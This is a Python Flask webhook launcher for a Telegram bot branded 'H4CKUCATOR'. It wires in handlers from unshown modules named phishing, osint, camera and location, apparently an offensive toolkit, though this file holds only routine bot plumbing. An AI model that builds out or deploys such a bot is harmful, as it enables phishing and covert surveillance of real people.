from flask import Flask, request
import telebot
import time
import os

from telebot import types
from start import setup_start_handler
from verify import setup_verification_handler
from menu import show_main_menu  # only for showing keyboard

# ✅ Your bot token and webhook setup
BOT_TOKEN = os.environ.get("BOT_TOKEN") or "YOUR_BOT_TOKEN"
WEBHOOK_URL = f"https://nine77105-rosy.onrender.com/{BOT_TOKEN}"  # Update if needed

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ✅ In-memory user data
users = {}
user_modes = {}

# ✅ Setup core handlers
setup_start_handler(bot, users, user_modes)
setup_verification_handler(bot, users)

# ✅ Add your feature handlers
from phishing import setup_phishing_handler
from osint import setup_osint_handler
from camera import setup_camera_handler
from location import setup_location_handler
# Add more as needed...

setup_phishing_handler(bot)
setup_osint_handler(bot)
setup_camera_handler(bot)
setup_location_handler(bot)

# ✅ Fallback for unknown messages
@bot.message_handler(func=lambda msg: True)
def fallback(msg):
    print(f"📩 Message from {msg.chat.id}: {msg.text}")
    bot.send_message(msg.chat.id, "🤖 I'm alive, but command not recognized!")

# ✅ Webhook endpoint
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    if request.headers.get("content-type") == "application/json":
        update = types.Update.de_json(request.get_data().decode("utf-8"))
        bot.process_new_updates([update])
        return "OK", 200
    return "Forbidden", 403

# ✅ Homepage
@app.route("/", methods=["GET"])
def index():
    return "👾 H4CKUCATOR Bot is Live", 200

# ✅ App Runner
if __name__ == "__main__":
    print("⚙️ Removing old webhook...")
    bot.remove_webhook()
    time.sleep(1)
    print("🚀 Setting new webhook...")
    bot.set_webhook(url=WEBHOOK_URL)
    print("✅ Webhook set. Bot is live!")

    app.run(host="0.0.0.0", port=10000)



